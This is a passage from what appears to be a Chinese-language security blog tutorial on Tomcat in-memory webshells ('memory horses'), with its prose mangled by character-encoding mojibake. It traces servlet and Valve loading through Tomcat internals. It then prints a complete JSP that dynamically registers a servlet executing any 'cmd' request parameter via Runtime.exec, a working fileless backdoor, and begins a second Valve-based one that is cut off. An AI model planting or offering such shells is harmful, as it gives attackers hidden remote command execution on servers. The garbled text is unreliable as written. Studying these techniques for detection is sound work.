&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>è®¿é—®å¯¹åº”çš„è·¯å¾„ä¼šå›æ˜¾é¡µé¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303440097-2a9ebd08-b7d5-49b7-8fe5-c80405d4ee76.png"></p><h4 id="2-3-3-è°ƒè¯•è¿‡ç¨‹"><a href="#2-3-3-è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="2.3.3 è°ƒè¯•è¿‡ç¨‹"></a>2.3.3 è°ƒè¯•è¿‡ç¨‹</h4><p>åƒfilterå’Œlistenerä¸€æ ·è°ƒè¯•ä¸€ä¸‹ä»–çš„åŠ è½½è¿‡ç¨‹</p><p>è¿™é‡Œå‚è€ƒ<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/</a>æ–‡ç« </p><p>æˆ‘ä»¬çŸ¥é“ tomcat åœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼šåŠ è½½web.xmlæ–‡ä»¶ï¼Œè€Œåœ¨listeneråˆ†æä¸­æˆ‘ä»¬çŸ¥é“web.xmlæ–‡ä»¶æ˜¯åœ¨ContexConfigç±»ä¸­çš„configureContextæ–¹æ³•é‡ŒåŠ è½½çš„ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹çœ‹è¯¥æ–¹æ³•å…·ä½“å’Œservletæœ‰å…³çš„<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303726531-2ace81c0-3851-4379-80cb-f719aa4538e1.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹åŠ è½½äº†web.xmlæ–‡ä»¶ä¸­é…ç½®çš„servletçš„ä¸€äº›ä¿¡æ¯ã€‚ç„¶åå°±åˆ›å»ºäº†ä¸€ä¸ªWrapperå¯¹è±¡</p><p>ç„¶åå°±è®¾ç½®ä¸€äº›wrapperçš„å±æ€§ã€‚éœ€è¦ç•™æ„çš„ä¸€ä¸ªç‰¹æ®Šå±æ€§æ˜¯load-on-startupå±æ€§ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¯åŠ¨ä¼˜å…ˆçº§ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716303919959-daaadfba-a971-4736-a6b3-f4260c1259bd.png"></p><p>è®¾ç½®å®Œä¹‹åä¼šå°†wrapperåŠ å…¥åˆ°standardcontexçš„childé‡Œã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716307433202-ceef5573-912b-4fb0-8020-f69488333d37.png"></p><p>ç„¶åä¸‹é¢ä¼šéå†web.xmlæ–‡ä»¶ä¸­servlet-mappingçš„servlet-nameå’Œå¯¹åº”çš„url-patternï¼Œè°ƒç”¨StandardContext.addServletMappingDecoded()æ·»åŠ servletå¯¹åº”çš„æ˜ å°„</p><p>æ€»ç»“ä¸€ä¸‹ï¼ŒServletçš„åˆå§‹åŒ–ä¸€å…±æœ‰å‡ ä¸ªæ­¥éª¤:</p><ol><li>é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡</li><li>è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼(åç»­åˆ†æä¸ºä»€ä¹ˆåŠ¨æ€æ³¨å†ŒServletéœ€è¦è®¾ç½®è¯¥å±æ€§)</li><li>è®¾ç½® Servlet çš„ Name</li><li>è®¾ç½® Servlet å¯¹åº”çš„ Class</li><li>å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­</li><li>å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„</li></ol><p>çœ‹ä¸€ä¸‹servletè£…è½½æµç¨‹ åœ¨loadservletä¸‹æ–­ç‚¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308136617-ada7f674-47b8-42ed-b2e9-784c0d4bc9dc.png"></p><p>å‘ä¸Šç¿»åˆ°standardcontexçš„startInternal()æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæ˜¯åœ¨åŠ è½½å®ŒListenerå’ŒFilterä¹‹åï¼Œæ‰è£…è½½Servlet:</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308325585-77c98d66-1ef4-4a32-bc79-ac3a129867e1.png"></p><p>è¿™é‡Œè°ƒç”¨äº†findChildren()æ–¹æ³•ä»StandardContextä¸­æ‹¿åˆ°æ‰€æœ‰çš„childå¹¶ä¼ åˆ°loadOnStartUp()æ–¹æ³•å¤„ç†ï¼Œè·Ÿåˆ°loadOnstartup()ï¼Œå¯ä»¥æ ¹æ®ä»£ç å’Œæ³¨é‡Šäº†è§£åˆ°è¿™ä¸ªæ–¹æ³•ä¼šå°†æ‰€æœ‰load-on-startupå±æ€§å¤§äº0çš„wrapperåŠ è½½(åä¹‹åˆ™ä¸ä¼š)ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸Šæ–‡æˆ‘ä»¬æåˆ°éœ€è¦å…³æ³¨è¿™ä¸ªå±æ€§çš„åŸå› :</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716308413491-730b5e2c-46e7-41e3-82a0-0a739a037d70.png">æ ¹æ®æœç´¢ï¼Œæˆ‘ä»¬äº†è§£åˆ°load-on-startupå±æ€§çš„ä½œç”¨:</p><p>:::tips<br>load-on-startup è¿™ä¸ªå…ƒç´ çš„å«ä¹‰æ˜¯åœ¨æœåŠ¡å™¨å¯åŠ¨çš„æ—¶å€™å°±åŠ è½½è¿™ä¸ªservlet(å®ä¾‹åŒ–å¹¶è°ƒç”¨init()æ–¹æ³•). è¿™ä¸ªå…ƒç´ ä¸­çš„å¯é€‰å†…å®¹å¿…é¡»ä¸ºä¸€ä¸ªæ•´æ•°,è¡¨æ˜äº†è¿™ä¸ªservletè¢«åŠ è½½çš„å…ˆåé¡ºåº. å½“æ˜¯ä¸€ä¸ªè´Ÿæ•°æ—¶æˆ–è€…æ²¡æœ‰æŒ‡å®šæ—¶ï¼Œåˆ™è¡¨ç¤ºæœåŠ¡å™¨åœ¨è¯¥servletè¢«è°ƒç”¨æ—¶æ‰åŠ è½½ã€‚</p><p>:::</p><p>å¯ä»¥çœ‹åˆ°å½“æœªè®¾ç½®load-on-startupå±æ€§æ˜¯ï¼Œtomcaté‡‡ç”¨çš„æ˜¯ä¸€ç§æ‡’åŠ è½½çš„æœºåˆ¶ï¼Œåªæœ‰servletè¢«è°ƒç”¨æ—¶æ‰ä¼šåŠ è½½åˆ°Contextä¸­ã€‚ç”±äºæˆ‘ä»¬éœ€è¦åŠ¨æ€æ³¨å†ŒServletï¼Œä¸ºäº†ä½¿å…¶è¢«åŠ è½½ï¼Œæˆ‘ä»¬å¿…é¡»è®¾ç½®load-on-startupå±æ€§ã€‚</p><p>æ ¹æ®ä¸Šè¿°çš„æµç¨‹åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡ä»¿ä¸Šè¿°çš„åŠ è½½æœºåˆ¶æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ªservlet:</p><ol><li>æ‰¾åˆ°StandardContext</li><li>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„servlet</li><li>é€šè¿‡ context.createWapper() åˆ›å»º Wapper å¯¹è±¡</li><li>è®¾ç½® Servlet çš„ LoadOnStartUp çš„å€¼</li><li>è®¾ç½® Servlet çš„ Name</li><li>è®¾ç½® Servlet å¯¹åº”çš„ Class</li><li>å°† Servlet æ·»åŠ åˆ° context çš„ children ä¸­</li><li>å°† url è·¯å¾„å’Œ servlet ç±»åšæ˜ å°„</li></ol><p>å‚è€ƒï¼š<a href="https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><h4 id="2-3-4å†…å­˜é©¬ç¼–å†™"><a href="#2-3-4å†…å­˜é©¬ç¼–å†™" class="headerlink" title="2.3.4å†…å­˜é©¬ç¼–å†™"></a>2.3.4å†…å­˜é©¬ç¼–å†™</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Sentiment&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">HttpServlet</span> <span class="variable">httpServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bis.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">                resp.getWriter().write(len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è·å¾—StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">stdcontext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä»StandardContext.createWapper()è·å¾—ä¸€ä¸ªWapperå¯¹è±¡</span></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> stdcontext.createWrapper();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> httpServlet.getClass().getSimpleName();</span><br><span class="line">    newWrapper.setName(name);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(httpServlet);</span><br><span class="line">    newWrapper.setServletClass(httpServlet.getClass().getName());</span><br><span class="line">    <span class="comment">//å°†Wrapperæ·»åŠ åˆ°StandardContext</span></span><br><span class="line">    stdcontext.addChild(newWrapper);</span><br><span class="line">    stdcontext.addServletMappingDecoded(<span class="string">&quot;/Sentiment&quot;</span>, name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="2-4valveå†…å­˜é©¬"><a href="#2-4valveå†…å­˜é©¬" class="headerlink" title="2.4valveå†…å­˜é©¬"></a>2.4valveå†…å­˜é©¬</h3><h5 id="2-4-1-valveæ˜¯ä»€ä¹ˆ"><a href="#2-4-1-valveæ˜¯ä»€ä¹ˆ" class="headerlink" title="2.4.1 valveæ˜¯ä»€ä¹ˆ"></a>2.4.1 valveæ˜¯ä»€ä¹ˆ</h5><p>åœ¨ä¸Šæ–‡æœ‰æ–‡ç« ä»‹ç»è¿‡valveæ˜¯ä»€ä¹ˆå¯ä»¥åœ¨çœ‹ä»¥ä¸‹æ–‡ç« <a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09">https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09</a></p><p><a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">https://www.cnblogs.com/coldridgeValley/p/5816414.html</a></p><p><a href="https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi=DtDkDlxGOUDyj+Ini33EErD&alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/13639?time__1311&#x3D;mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref&#x3D;https%3A%2F%2Fcn.bing.com%2F</a></p><p>è¿™é‡Œç›´æ¥è´´å‡ºå‚è€ƒæ–‡ç« çš„è§£é‡Š</p><p>tomcatä¸­çš„Containeræœ‰4ç§ï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextå’ŒWrapperï¼Œè¿™4ä¸ªContainerçš„å®ç°ç±»åˆ†åˆ«æ˜¯StandardEngineã€StandardHostã€StandardContextå’ŒStandardWrapperã€‚4ç§å®¹å™¨çš„å…³ç³»æ˜¯åŒ…å«å…³ç³»ï¼ŒEngineåŒ…å«Hostï¼ŒHoståŒ…å«Contextï¼ŒContextåŒ…å«Wrapperï¼ŒWrapperåˆ™ä»£è¡¨æœ€åŸºç¡€çš„ä¸€ä¸ªServlet<font style="color:rgb(51, 51, 51);">ã€‚<br></font>tomcatç”±Connectorå’ŒContainerä¸¤éƒ¨åˆ†ç»„æˆï¼Œè€Œå½“ç½‘ç»œè¯·æ±‚è¿‡æ¥çš„æ—¶å€™Connectorå…ˆå°†è¯·æ±‚åŒ…è£…ä¸ºRequestï¼Œç„¶åå°†Requestäº¤ç”±Containerè¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆè¿”å›ç»™è¯·æ±‚æ–¹ã€‚è€ŒContainerå¤„ç†çš„ç¬¬ä¸€å±‚å°±æ˜¯Engineå®¹å™¨ï¼Œä½†æ˜¯åœ¨tomcatä¸­Engineå®¹å™¨ä¸ä¼šç›´æ¥è°ƒç”¨Hostå®¹å™¨å»å¤„ç†è¯·æ±‚ï¼Œé‚£ä¹ˆè¯·æ±‚æ˜¯æ€ä¹ˆåœ¨4ä¸ªå®¹å™¨ä¸­æµè½¬çš„ï¼Œ4ä¸ªå®¹å™¨ä¹‹é—´æ˜¯æ€ä¹ˆä¾æ¬¡è°ƒç”¨çš„å‘¢ï¼Ÿ</p><p>åŸæ¥ï¼Œå½“è¯·æ±‚åˆ°è¾¾Engineå®¹å™¨çš„æ—¶å€™ï¼ŒEngineå¹¶éæ˜¯ç›´æ¥è°ƒç”¨å¯¹åº”çš„Hostå»å¤„ç†ç›¸å…³çš„è¯·æ±‚ï¼Œè€Œæ˜¯è°ƒç”¨äº†è‡ªå·±çš„ä¸€ä¸ªç»„ä»¶å»å¤„ç†ï¼Œè¿™ä¸ªç»„ä»¶å°±å«åšpipelineç»„ä»¶ï¼Œè·Ÿpipelineç›¸å…³çš„è¿˜æœ‰ä¸ªä¹Ÿæ˜¯å®¹å™¨å†…éƒ¨çš„ç»„ä»¶ï¼Œå«åšvalveç»„ä»¶ã€‚</p><p>Pipelineçš„ä½œç”¨å°±å¦‚å…¶ä¸­æ–‡æ„æ€ä¸€æ ·â€”â€”ç®¡é“ï¼Œå¯ä»¥æŠŠä¸åŒå®¹å™¨æƒ³è±¡æˆä¸€ä¸ªç‹¬ç«‹çš„ä¸ªä½“ï¼Œé‚£ä¹ˆpipelineå°±å¯ä»¥ç†è§£ä¸ºä¸åŒå®¹å™¨ä¹‹é—´çš„ç®¡é“ï¼Œé“è·¯ï¼Œæ¡¥æ¢ã€‚é‚£Valveè¿™ä¸ªç»„ä»¶æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼ŸValveä¹Ÿå¯ä»¥ç›´æ¥æŒ‰ç…§å­—é¢æ„æ€å»ç†è§£ä¸ºé˜€é—¨ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç”Ÿæ´»ä¸­å¯ä»¥çœ‹åˆ°æ¯ä¸ªç®¡é“ä¸Šé¢éƒ½æœ‰é˜€é—¨ï¼ŒPipelineå’ŒValveå…³ç³»ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚Valveä»£è¡¨ç®¡é“ä¸Šçš„é˜€é—¨ï¼Œå¯ä»¥æ§åˆ¶ç®¡é“çš„æµå‘ï¼Œå½“ç„¶æ¯ä¸ªç®¡é“ä¸Šå¯ä»¥æœ‰å¤šä¸ªé˜€é—¨ã€‚å¦‚æœæŠŠPipelineæ¯”ä½œå…¬è·¯çš„è¯ï¼Œé‚£ä¹ˆValveå¯ä»¥ç†è§£ä¸ºå…¬è·¯ä¸Šçš„æ”¶è´¹ç«™ï¼Œè½¦ä»£è¡¨Pipelineä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæ¯ä¸ªæ”¶è´¹ç«™éƒ½ä¼šå¯¹å…¶ä¸­çš„å†…å®¹åšä¸€äº›å¤„ç†ï¼ˆæ”¶è´¹ï¼ŒæŸ¥è¯ä»¶ç­‰ï¼‰ã€‚</p><p>åœ¨Catalinaä¸­ï¼Œ4ç§å®¹å™¨éƒ½æœ‰è‡ªå·±çš„Pipelineç»„ä»¶ï¼Œæ¯ä¸ªPipelineç»„ä»¶ä¸Šè‡³å°‘ä¼šè®¾å®šä¸€ä¸ªValveï¼Œè¿™ä¸ªValveæˆ‘ä»¬ç§°ä¹‹ä¸ºBaseValveï¼Œä¹Ÿå°±æ˜¯åŸºç¡€é˜€ã€‚åŸºç¡€é˜€çš„ä½œç”¨æ˜¯è¿æ¥å½“å‰å®¹å™¨çš„ä¸‹ä¸€ä¸ªå®¹å™¨ï¼ˆé€šå¸¸æ˜¯è‡ªå·±çš„è‡ªå®¹å™¨ï¼‰ï¼Œå¯ä»¥è¯´åŸºç¡€é˜€æ˜¯ä¸¤ä¸ªå®¹å™¨ä¹‹é—´çš„æ¡¥æ¢ã€‚</p><p>Pipelineå®šä¹‰å¯¹åº”çš„æ¥å£Pipelineï¼Œæ ‡å‡†å®ç°äº†StandardPipelineã€‚Valveå®šä¹‰å¯¹åº”çš„æ¥å£Valveï¼ŒæŠ½è±¡å®ç°ç±»ValveBaseï¼Œ4ä¸ªå®¹å™¨å¯¹åº”åŸºç¡€é˜€é—¨åˆ†åˆ«æ˜¯StandardEngineValveï¼ŒStandardHostValveï¼ŒStandardContextValveï¼ŒStandardWrapperValveã€‚åœ¨å®é™…è¿è¡Œä¸­ï¼ŒPipelineå’ŒValveè¿è¡Œæœºåˆ¶å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716440271103-726110c8-9d27-4a52-9bbd-47ea3d19cd07.png"></p><h5 id="2-4-2è°ƒç”¨è¿‡ç¨‹"><a href="#2-4-2è°ƒç”¨è¿‡ç¨‹" class="headerlink" title="2.4.2è°ƒç”¨è¿‡ç¨‹"></a>2.4.2è°ƒç”¨è¿‡ç¨‹</h5><p>è¿™é‡Œæˆ‘ä»¬åœ¨filterçš„æ–¹æ³•é‡Œä¸‹ä¸€ä¸ªæ–­ç‚¹çœ‹ä¸€ä¸‹ Valveè°ƒç”¨è¿‡ç¨‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449163052-b3a03e1e-329a-4e4d-8398-d488579c8c21.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç®­å¤´ä¸­æŒ‡çš„åœ°æ–¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449314426-4e35fd99-a769-4699-a116-5c049372f7d6.png">åœ¨æ¥æ”¶åˆ°Httpè¯·æ±‚ä¹‹åè°ƒç”¨äº†ç®­å¤´æ‰€æŒ‡çš„æ–¹æ³•å…¶è°ƒç”¨CoyoteAdapterç±»é‡Œé¢çš„serviceæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449508615-332fd3b5-6f36-4228-a88e-4dabc9df6aa1.png"></p><p>è¯¥æ–¹æ³•ä¸­è·å–äº†Pipelineçš„ç¬¬ä¸€ä¸ªValveï¼Œå¹¶ä¸”è°ƒç”¨äº†invokeä¹Ÿå°±æ˜¯StandardEngineValve</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449722618-6c65e4a5-4216-4104-88b9-bd9ac9c5b1dd.png"></p><p>ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716449761818-4a3212b2-acb8-494f-8d01-6824ff1bb6af.png"></p><p>å‘ç°è°ƒç”¨äº†ä¸‹ä¸€ä¸ªvalveä¹Ÿå°±æ˜¯è°ƒç”¨æ ˆä¸­æ‰€è¡¨ç¤ºå‡ºæ¥çš„é‚£äº›valveå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ï¼Œæœ€åè°ƒç”¨åˆ°StandardWrapperValveè¿™ä¸ªvalveç„¶åå°±è°ƒç”¨filterè¿‡æ»¤é“¾ä¹‹ååœ¨è°ƒç”¨servlet</p><p>æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ€è€ƒä¸€ä¸‹å”‰ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿåœ¨è¿™ä¸ªpipelineè¿™ä¸ªç®¡é“ä¸­ç»™ä»–æ·»åŠ ä¸€ä¸ªæˆ‘ä»¬æ¶æ„çš„valveé‚£ä¹Ÿå°±æ˜¯å¯ä»¥æ³¨å…¥å†…å­˜é©¬ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å°†valveåŠ å…¥åˆ°ç®¡é“ä¸­çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°pipelineè¿™ä¸ªæ¥å£ä¸­å­˜åœ¨ä¸€ä¸ªæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450092523-05413266-8bf2-453a-99f4-3f708c0ede3f.png"></p><p>å­˜åœ¨ä¸€ä¸ªaddValveæ–¹æ³•å¯ä»¥æ·»åŠ è¿›å»ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹Pipelineçš„å®ç°ç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716450704081-7e2bacee-1e3c-4dae-adc9-4081a9a38731.png"></p><p>æ‰€ä»¥åªéœ€è¦è·å–StanderdPipeline å¯¹è±¡å°±å¯ä»¥äº†ã€‚åˆå› ä¸ºæˆ‘ä»¬åœ¨jspä¸­ä¸èƒ½å¤Ÿç›´æ¥è·å–åˆ°StanderdPipelineå¯¹è±¡åªèƒ½è·å–åƒstandardcontext è¿™ç±»å¯¹è±¡ï¼Œæˆ‘ä»¬çœ‹çœ‹ä»–æœ‰æ²¡æœ‰èƒ½ç›´æ¥è·å–StanderdPipelineå¯¹è±¡çš„æ–¹æ³•ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716451334308-dc7c779d-aa8a-4f37-b031-519ea66c5a46.png"></p><p>å¯ä»¥å‘ç°åœ¨é‡Œé¢æœ‰getPipelineè¿™ä¸ªæ–¹æ³•ã€‚å°±æ˜¯è¿”å›çš„StanderdPipelineå¯¹è±¡æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™æˆ‘ä»¬çš„å†…å­˜é©¬äº†ã€‚</p><p>æ€»ç»“</p><p>ç¼–å†™Valveæ¶æ„ç±»ï¼Œå®ç°Valveæ¥å£ï¼Œé‡å†™invoke-&gt;æ¶æ„ä»£ç é€»è¾‘</p><p>è·å–StandardContextå¯¹è±¡</p><p>StandardContext.getPipelineè·å–StandardPipeline</p><p>StandardPipeline.addValve(Valve_Shell)æ·»åŠ æ¶æ„Valve</p><p>åˆ†ææµç¨‹å‚è€ƒç½‘ä¸Šçš„æˆ‘è‡ªå·±çš„ç¯å¢ƒæœ‰ç‚¹é—®é¢˜æ²¡æ³•è¿›å…¥è°ƒè¯•</p><p><a href="https://lemono.fun/tomcat-valve-ws/#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Valve">https://lemono.fun/tomcat-valve-ws/#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0Valve</a></p><p><a href="https://xz.aliyun.com/t/13639?time__1311=mqmxnQ0QiQi=DtDkDlxGOUDyj+Ini33EErD&alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/13639?time__1311&#x3D;mqmxnQ0QiQi%3DDtDkDlxGOUDyj%2BIni33EErD&amp;alichlgref&#x3D;https%3A%2F%2Fcn.bing.com%2F</a></p><h5 id="2-4-3demoç¼–å†™"><a href="#2-4-3demoç¼–å†™" class="headerlink" title="2.4.3demoç¼–å†™"></a>2.4.3demoç¼–å†™</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span 